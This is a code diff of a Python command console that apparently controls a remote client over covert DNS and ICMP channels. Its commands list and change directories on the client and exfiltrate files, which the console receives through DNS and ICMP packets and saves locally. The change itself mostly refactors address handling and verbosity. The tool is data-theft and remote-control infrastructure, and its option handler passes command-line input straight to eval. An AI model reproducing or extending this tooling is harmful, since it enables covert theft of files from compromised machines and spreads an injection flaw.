@@ -17,9 +17,8 @@ complete = False
 packetCount = 0
 
 bindAddress = "127.0.0.1"
-dstAddress  = "127.0.0.1"
 
-options = {'clientIP':'127.0.0.1', 'verbose':True}
+options = {'clientIP':'127.0.0.1', 'verbose':False}
 
 bindPort    = 53
 dstPort     = 1337
@@ -51,10 +50,10 @@ def init():
     console().cmdloop()
 
 def calculateChecksum(data):
-    return
+    pass
 
 def confirmIntegrity(checksum):
-    return
+    pass
 
 def parseDNSPacket(data):
     global complete
@@ -105,8 +104,8 @@ def createDNSPacket(data):
     return dnsHeader + query + end
 
 def startFileReceive():
-
     pass
+
 def isEndOfFile(data):
     global complete
 
@@ -124,8 +123,9 @@ def receiveICMP(isFile):
         if options['verbose']:
             print("Received ICMP packet from: " + str(addr))
         # Remove erroneous packets not from client
-        # TODO: Need further checks as broadcasts still may come from client
-        if addr[0] == dstAddress:
+        # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client
+
+        if addr[0] == options['clientIP']:
             parsed = parseICMPPacket(data)
             if isEndOfFile(parsed):
                 if options['verbose']:
@@ -145,7 +145,8 @@ def receiveICMP(isFile):
                 else:
                     print(parsed.decode())
         else:
-            print("Useless packet.")
+            if options['verbose']:
+                print("Useless packet.")
 
 def receiveDNS(isFile):
     global complete
@@ -156,8 +157,9 @@ def receiveDNS(isFile):
         if options['verbose']:
             print("Received DNS packet from: " + str(addr))
         # Remove erroneous packets not from client
-        # TODO: Need further checks as broadcasts still may come from client
-        if addr[0] == dstAddress:
+        # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client
+        
+        if addr[0] == options['clientIP']:
             parsed = parseDNSPacket(data)
             if isEndOfFile(parsed):
                 if options['verbose']:
@@ -190,7 +192,6 @@ def receiveData(isFile=False, fileName=None):
 
     # If receiving a file then open file with given name
     if isFile:
-        # Wait for SOF, open file with data from SOF, including file name and extension
         if options['verbose']:
             print("Opening file '" + fileName + "'")
         handle = open("output/" + fileName, "wb")
@@ -206,28 +207,28 @@ def receiveData(isFile=False, fileName=None):
     while not complete:
         pass
 
-    print("Done")
-
-# TODO: IMPORTANT, receiveData(), use writeToFile flag, listen until endOfTransmission()
+    if options['verbose']:
+        print("Done")
 
 def listen():
-
+    # TODO: IMPORTANT, remove, debugging purposes only
     while True:
         data = receiveICMPSocket.recv(1024)
         print("Received packet from: " + str(addr))
         #print(data)
         # Remove erroneous packets not from client
         # TODO: Need further checks as broadcasts still may come from client
-        #if addr[0] == dstAddress:
+        #if addr[0] == options['clientIP']:
         #    parseDNSPacket(data)
         #else:
         #    print("Useless packet.")
+
 def close():
     if options['verbose']:
         print("Closing file and socket")
     #receiveDNSSocket.close()
     handle.close()
-    pass
+    
 class console(cmd.Cmd):
     intro = '''\
   ______      ___    ___ ________ ___  ___       _____ ______   ________     
@@ -245,22 +246,23 @@ Written by Harvey Stocks.\n
     def do_remls(self, args):
         # Get list of files in working directory from client
         testPacket = createDNSPacket(b'remls')
-        sendSocket.sendto(testPacket, (dstAddress, dstPort))
+        sendSocket.sendto(testPacket, (options['clientIP'], dstPort))
         receiveData()
 
     def do_remcd(self, args):
         # Set working directory on client
         testPacket = createDNSPacket(b'remcd ' + args.encode())
-        sendSocket.sendto(testPacket, (dstAddress, dstPort))
+        sendSocket.sendto(testPacket, (options['clientIP'], dstPort))
         
     def do_rempwd(self, args):
         # Get working directory from client
-        #print("Sending")
         testPacket = createDNSPacket(b'rempwd')
-        sendSocket.sendto(testPacket, (dstAddress, dstPort))
+        sendSocket.sendto(testPacket, (options['clientIP'], dstPort))
         receiveData()
 
     def do_close(self, args):
+        # TODO: IMPORTANT, remove, debugging purposes only
+        # Close file handle
         handle.close()
     
     def do_setopt(self, args):
@@ -276,7 +278,7 @@ Written by Harvey Stocks.\n
             return
 
         if args[0] in options:
-            # TODO: IMPORTANT, using eval straight off the command line is ridiculously unsafe
+            # TODO: IMPORTANT, using eval straight off the command line is ridiculously unsafe, change it
             options[args[0]] = eval(args[1], {}, {})
             #print(type(options[args[0]]))
         else:
@@ -284,6 +286,9 @@ Written by Harvey Stocks.\n
             return
 
     def do_showopts(self, args):
+        # < is left align
+        # =^ means pad with '='
+        # 15 is the width of output
         print("{:<15} {:<15}".format("Option", "Value"))
         print("{:=^15} {:=^15}".format("", ""))
         for k,v in options.items():
@@ -340,18 +345,13 @@ Written by Harvey Stocks.\n
         fileName = os.path.split(parsedArgs.file)[1]
         command = ("exfil " + argString).encode()
         packet = createDNSPacket(command)
-        sendSocket.sendto(packet, (dstAddress, dstPort))
+        sendSocket.sendto(packet, (options['clientIP'], dstPort))
         receiveData(True, fileName)
-        # TODO: Add timeout for initiating file receive
+        # TODO: IMPORTANT, Add timeout for initiating file receive
         
     def do_threadStatus(self,args):
         print(receiveDNSThread.isAlive())
         print(receiveICMPThread.isAlive())
-
-    def do_test(self, args):    
-        print("Sending")
-        testPacket = createDNSPacket(b'Testing')
-        sendSocket.sendto(testPacket, (dstAddress, dstPort))
 
     def do_exit(self, args):
         '''
@@ -364,14 +364,12 @@ Written by Harvey Stocks.\n
             else:
                 return
         '''
-    def do_status(self, args):
-        print("Idle.")
 
     def emptyline(self):
         print("Enter a command. Type 'help' to display help page.")
+
     def default(self, line):
         print("'{}' is not recognised as a command.".format(line))
 
 if __name__ == '__main__':
     main()
-#init()
